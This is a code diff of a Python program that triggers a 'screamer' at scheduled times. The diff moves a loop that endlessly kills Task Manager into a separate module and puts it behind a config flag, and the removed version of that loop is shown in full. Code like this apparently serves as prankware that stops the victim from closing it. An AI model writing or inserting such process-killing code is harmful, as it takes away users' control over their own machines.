@@ -1,8 +1,10 @@
 from threading import Thread
-import psutil
 from config import *
 import datetime
 import screamer
+
+if KILL_TASKMGR:
+    import taskmgr_killer
 
 
 def match_time(time: datetime.time, template: str):
@@ -36,18 +38,9 @@ def scream():
             screamer.run()
 
 
-def taskmgr_kill():
-    while True:
-        for process in psutil.process_iter(['pid', 'name']):
-            try:
-                if process.info['name'] != "Taskmgr.exe": continue
-                process.terminate()
-            except (psutil.NoSuchProcess, psutil.AccessDenied):
-                continue
-
-
 def main():
-    Thread(target=taskmgr_kill).start()
+    if KILL_TASKMGR:
+        Thread(target=taskmgr_killer.taskmgr_kill).start()
     scream()
 
 
